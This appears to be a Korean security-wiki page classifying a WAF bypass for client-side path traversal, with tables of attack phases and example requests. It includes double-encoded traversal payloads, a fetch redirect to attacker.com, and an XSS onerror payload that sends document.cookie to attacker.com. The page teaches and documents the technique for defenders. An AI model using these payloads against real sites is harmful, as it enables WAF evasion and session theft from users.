---
title: Path Traversal Encoding Bypass
description: 
published: true
date: 2025-07-31T16:21:08.988Z
tags: attack success validation, data exfiltration, cross‑site scripting (xss), decoding level analysis, directory depth obfuscation, multi‑level encoding bypass
editor: markdown
dateCreated: 2025-07-23T10:46:09.630Z
---

# Path Traversal Encoding Bypass
## 개요
“Path Traversal Encoding Bypass”은 클라이언트 측 자바스크립트가 URL 경로 구성 요소에 사용자 입력을 직접 포함시켜 fetch 요청을 보낼 때, WAF(Web Application Firewall)와 애플리케이션 간의 URL 디코딩 횟수 차이를 이용하여 우회 공격을 수행하는 기법이다. 이 취약점은 코드 내에서 경로 구성 요소가 적절히 인코딩 또는 검증되지 않는 환경에서 `..` 또는 `..%2f` 등의 URL-인코딩 경로 조작을 통해 발생한다. 예시로 공격자는 WAF의 디코딩 레벨보다 더 많은 디코딩을 의도적으로 수행해(fetch 이전에 JS가 여러 번 디코딩), WAF는 탐지하지 못하는 반면, 애플리케이션은 경로를 풀어 fetch를 악용하여 임의 엔드포인트로 호출이나 추가 공격으로 확대할 수 있다. 이로 인해 클라이언트 측에서 발생하는 경로 기반 우회 공격과 체인된 XSS 등 후속 공격이 발생한다.


## 분류

> 구문 분석 불일치 (Syntax parsing Gap)  
> → 경로 파싱 불일치 (Path Parsing Mismatch)  
> → Path Traversal Encoding Bypass

## 절차

| Phase           | Description                                                                                                                                                                        |
|-----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Reconnaissance  | 대상 애플리케이션의 fetch 요청에 포함된 경로 파라미터가 내부에서 몇 차례 디코딩되는지, 그리고 WAF가 URL 경로의 깊이(depth)를 어떻게 검사하는지를 파악한다.                                  |
| Obfuscation     | WAF, 브라우저, 애플리케이션 간의 디코딩 레벨 차이를 기반으로 WAF 탐지를 우회하는 페이로드를 설계한다.                                                                                 |
| Bypass          | 설계한 페이로드를 실제 요청에 적용해서 WAF의 depth 필터를 통과시키고 애플리케이션에 도달시킨다.                                                                                    |
| Validation      | 설계한 페이로드가 실제 fetch 요청에서 우회 동작을 유발하는지 확인하고, fetch가 공격자가 의도한 경로로 전송되는지 확인한다. 또한 자동 리디렉션 처리 여부를 확인해 후속 공격 가능성도 검증한다. |
| Exploitation    | `../` 우회를 통해 fetch 요청을 `/redirect?u=https://attacker.com`등으로 유도하고, 앱의 자동 리디렉션 및 응답 처리를 통해 공격자가 제어한 HTML이 삽입되도록 만들어 XSS 등 실제 공격을 실행한다.   |
| Exfiltration    | 공격자가 제어하는 응답을 통해 사용자 쿠키, 액세스 토큰 등의 민감 정보를 탈취하거나 공격 서버로 전송한다. fetch 응답이 페이지에 출력되기 때문에 HTML/JS 기반의 정보 수집이 가능하다.         |

<div style="text-align: left;">
  <img
    src="/path_traversal_encoding_bypass.png"
    alt="Path Traversal Encoding Bypass 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>



## 공격 기법

### Reconnaissance

| 공격 기법               | 예시                                                                                                      | 설명                                                                                                                                                     | 출처 |
|-------------------------|-----------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Decoding Level Analysis | `GET /viewpost/%2e%2e%2f` (1회 인코딩)<br>`GET /viewpost/%252e%252e%252f` (2회 인코딩)                    | 다양한 수준으로 인코딩된 경로 조작 페이로드를 전송하여, WAF와 애플리케이션이 각각 몇 번의 디코딩을 수행하는지 응답의 차이를 통해 파악한다.                | [1]  |

### Obfuscation

| 공격 기법                   | 예시                                       | 설명                                                                                                                                                   | 출처 |
|-----------------------------|--------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Directory Depth Obfuscation | `GET /viewpost/a/b/../../redirect...`      | WAF가 경로의 깊이(depth)를 검사하여 `../` 같은 음수 깊이를 차단할 때, `a/b/../../`와 같이 정상 디렉터리를 앞에 추가하여 WAF가 계산하는 최종 깊이를 0 이상으로 만들어 우회한다. | [1]  |

### Bypass

| 공격 기법                                                     | 예시                                              | 설명                                                                                                                                                                                     | 출처 |
|---------------------------------------------------------------|---------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Multi-level Encoding Bypass &lt;br&gt; (WAF level < App level)           | `GET /viewpost/..%252f..%252f...`                 | WAF의 디코딩 횟수보다 더 많이 페이로드를 인코딩한다. WAF는 디코딩 후에도 `..`를 인식하지 못해 통과시키지만, 더 많이 디코딩하는 애플리케이션은 이를 `../`로 해석하여 공격이 성공한다. | [1]  |
| Depth Obfuscation & Encoding Bypass &lt;br&gt; (WAF level > App level)   | `GET /viewpost/a%252fa%252f..%252f..%252f...`     | WAF가 더 많이 디코딩하는 점을 역이용한다. WAF는 `a/a/../..`로 해석하여 깊이가 정상이므로 통과시키지만, 적게 디코딩하는 애플리케이션은 `a%2fa/../../`를 `../`로 해석하여 공격이 성공한다.        | [1]  |
| Browser-based Path Normalization Bypass &lt;br&gt; (WAF level == App level) | `GET /viewpost/%252e%252e%2f%252e%252e%2f...`   | WAF와 앱이 모두 `%2e%2e/`로 디코딩하게 만든다. WAF는 이를 안전하다고 판단하지만, 브라우저의 fetch는 `%2e%2e/`를 `../`와 동일하게 처리(경로 정규화)하여 우회가 발생한다.                  | [1]  |

### Validation

| 공격 기법                     | 예시                                                                                   | 설명                                                                                                                                                                                                              | 출처 |
|-------------------------------|----------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Redirect Payload Verification | `fetch("/api/posts/get_content/../../../redirect?u=https://attacker.com")`             | 공격자가 삽입한 페이로드가 브라우저와 애플리케이션의 디코딩을 거쳐, 최종적으로 의도한 경로(`redirect?u=...`)로 fetch 요청을 보내는지 개발자 도구 등을 통해 확인한다. 또한 자동 리디렉션 처리 여부를 확인해 후속 공격 가능성도 검증한다. | [1]  |

### Exploitation

| 공격 기법                         | 예시                                                                                             | 설명                                                                                                                                                                            | 출처 |
|-----------------------------------|--------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Fetch-based XSS via Open Redirect | `GET /viewpost/%252e%252e%2f%252e%252e%2f%252e%252e%2fredirect%3fu=https:%2f%2fattacker.com` | 경로 조작으로 fetch가 공격자의 서버로 리디렉션되도록 유도한다. 공격자 서버가 반환한 악성 HTML이 페이지에 렌더링되면서 Cross‑Site Scripting(XSS)이 실행된다.                      | [1]  |

### Exfiltration

| 공격 기법                      | 예시                                                                                      | 설명                                                                                                                                                                   | 출처 |
|--------------------------------|-------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------|
| Cookie Theft via onerror Event | `<video><source onerror=location='//attacker.com/'+document.cookie>`                     | Exploitation을 통해 주입된 스크립트는 onerror 이벤트 핸들러를 사용하여, 피해자의 쿠키(`document.cookie`)를 location 객체를 통해 공격자의 서버로 전송시킨다.            | [A]  |

---

## 분류에 해당하는 문서
- [1] [Bypassing WAFs to Exploit CSPT Using Encoding Levels](https://matanber.com/blog/cspt-levels)

## 기타 참고 문헌
- [A] [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

